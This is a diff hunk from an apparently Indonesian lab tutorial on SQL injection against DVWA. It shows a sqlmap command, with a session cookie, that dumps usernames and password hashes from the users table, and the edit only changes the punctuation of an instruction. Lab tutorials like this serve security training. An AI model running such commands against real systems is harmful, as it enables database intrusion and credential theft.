@@ -41,6 +41,6 @@
 ```
 ./sqlmap.py -u "http://10.0.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=7a1cd3cef9aa5096f198d9e0307c25f7; security=low" -D dvwa -T users -C user,password --dump
 ```
-pilih "y" atau Y untuk semua pilihan dan kosongkan dictionary lokasi.
+pilih y atau Y untuk semua pilihan dan kosongkan dictionary lokasi.
 ![Gambar](image/41-voila.PNG)
 
